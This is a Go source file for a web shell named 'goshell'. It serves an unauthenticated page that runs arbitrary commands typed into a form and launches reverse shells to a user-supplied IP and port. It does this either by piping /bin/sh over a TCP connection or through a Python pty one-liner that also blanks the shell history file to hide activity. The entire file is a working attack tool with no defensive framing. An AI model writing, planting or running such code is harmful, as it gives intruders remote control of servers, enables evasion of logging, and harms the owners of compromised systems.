package main 

import (
    "fmt"
    "net"
    "net/http"
    "html/template"
    "os/exec"
    "runtime"
    "strings"
    "flag"
)

func reverseShell(ip string, port string) {
    c, _ := net.Dial("tcp", ip + ":" + port)
    cmd := exec.Command("/bin/sh")
    cmd.Stdin=c
    cmd.Stdout=c
    cmd.Stderr=c
    cmd.Run()
}



func runCmd(cmd string) string {
    if runtime.GOOS == "windows" {
        sh := "cmd.exe"
        out, err := exec.Command(sh,"/K", cmd).Output()
        if err != nil {
            return fmt.Sprintf("Error: %s", err)
        }
        return string(out)
    }
    sh := "sh"
    out, err := exec.Command(sh, "-c", cmd).Output()
    if err != nil {
        return fmt.Sprintf("Error: %s", err)
    }
    return string(out)
}

func handler(w http.ResponseWriter, r *http.Request) {

    page := 
    `<!DOCTYPE html>
<html>
<head>
  <title>goshell</title>
  <style>
  div {border: 1px solid black; padding: 5px; width: 820px; background-color: #808080; margin-left: auto; margin-right: auto;}
  </style>
</head>
<body bgcolor="#1a1a1a">
  <div>
  <b>Reverse Shell</b>
  <form action="/" method="POST">
    IP: <input type="text" name="ip" value="localhost"/>
    Port: <input type="text" name="port" value="4443"/>
    <select name="ver">
      <option value="go">Go</option>
      <option value="py">py pty</option>
    </select>
    <input type="submit" value="run">
  </form>
  </div>
  <br>
  <div>
  <textarea style="width:800px; height:400px;">{{.}}</textarea>
  <br>
  <form action="/" method="POST">
    <input type="text" name="cmd" style="width: 720px" autofocus>
    <input type="submit" value="run" style="width: 75px">
  </form>
  </div>
</body>
</html>
    `

    out := ""
    if r.Method == "POST" {
        r.ParseForm()
        if len(r.Form["ip"]) > 0 && len(r.Form["port"]) > 0 {
            ip := strings.Join(r.Form["ip"], " ")
            port := strings.Join(r.Form["port"], " ")
            ver := strings.Join(r.Form["ver"], " ")
            if runtime.GOOS != "windows" {
                if ver == "py" {
                    payload := "python -c 'import os, pty, socket; h = \"" + ip + "\"; p = " + port + "; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((h, p)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close();'"
                    go runCmd(payload)
                }else {
                    go reverseShell(ip, port)
                }
                out = "Reverse shell launched to " + ip + ":" + port
            } else {
                out = "No reverse shell on windows yet."
            }
            
        }
        if len(r.Form["cmd"]) > 0 {
            cmd := strings.Join(r.Form["cmd"], " ")
            out = "$ " + cmd + "\n" + runCmd(cmd)
        }
    }

    t := template.New("page")
    t, _ = t.Parse(page)
    t.Execute(w, out)
}

func main() {
    var ip, port string
    flag.StringVar(&ip, "ip", "", "IP")
    flag.StringVar(&port, "port", "8080", "Port")
    flag.Parse()

    http.HandleFunc("/", handler)
    http.ListenAndServe(ip + ":" + port, nil)
}
